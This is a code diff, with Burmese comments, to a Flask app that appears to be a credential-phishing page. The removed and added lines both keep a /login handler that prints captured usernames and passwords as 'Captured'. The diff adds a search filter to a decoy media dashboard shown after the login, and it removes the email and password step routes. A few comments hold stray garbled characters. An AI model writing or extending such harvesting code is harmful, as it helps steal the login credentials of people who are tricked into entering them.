@@ -279,7 +279,8 @@ Dashboard_html = """
         </form>
     </div>
     
-    <div class="content">
+        <div class="content">
+        {% if show_music %}
         <div class="card">
             <h3>🎵 Music Player</h3>
             <p>ကြိုက်နှစ်သက်ရာ သီချင်းများ နားဆင်ရန်</p>
@@ -288,33 +289,50 @@ Dashboard_html = """
                 Your browser does not support the audio element.
             </audio>
         </div>
+        {% endif %}
         
+        {% if show_video %}
         <div class="card">
             <h3>📺 Video Player</h3>
             <p>ဗီဒီယိုများ ကြည့်ရှုရန်</p>
             <iframe width="100%" height="315" src="https://www.youtube.com/embed/tgbNymZ7vqY" frameborder="0" allowfullscreen></iframe>
         </div>
+        {% endif %}
     </div>
+    
 </body>
 </html>
 """
-@app.route("/")
-def index():
-    return render_template_string(email_html)
-
-@app.route("/password", methods=["POST"])
-def password():
-    username = request.form.get("username")
-    return render_template_string(password_html, username=username)
-
-@app.route("/login", methods=["POST"])
+@app.route("/login", methods=["GET", "POST"])
 def login():
-    username = request.form.get("username")
-    password = request.form.get("password")
-    print(f"Captured -> Username: {username}, Password: {password}")
+    # POST Method နဲ့ ဝင်လာရင် Username ကို Form ကနေ ယူမယ်
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        print(f"Captured -> Username: {username}, Password: {password}")
+    else:
+        # GET Method (Search လုပ်တဲ့အခါမျိုး) မှာ Username ကို လုံခြုံစွာနဲ့ ယာယီသတ်မှတ်မယ်
+        username = "User"
+
+    # Search Bar ထဲမှာ ရိုက်လိုက်တဲ့ စာသားကို ဖမ်းယူခြင်း
+    search_query = request.args.get("query", "").lower()
     
-    return render_template_string(Dashboard_html, username=username)
+    # ရိုက်လိုက်တဲ့ စာသားအပေါ်မူတည်ပြီး ဘာတွေပြမလဲ စစ်ဆေးခြင်း
+    show_music = True
+    show_video = True
     
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+    if search_query:
+        if "music" in search_query or "သီချင်း" in search_query:
+            show_video = False # သီချင်းပဲ ရှာရင် Video ကို ဖخမယ်
+        elif "video" in search_query or "ဗီဒီယို" in search_query:
+            show_music = False # ဗီဒီယိုပဲ ရှာရင် Music ကို ဖخမယ်
+
+    # Dashboard HTML ကို render လုပ်တဲ့အခါ Search အခြေအနေတွေကို ပို့ပေးမယ်
+    return render_template_string(
+        Dashboard_html, 
+        username=username, 
+        show_music=show_music, 
+        show_video=show_video,
+        search_query=search_query)
+    
+    
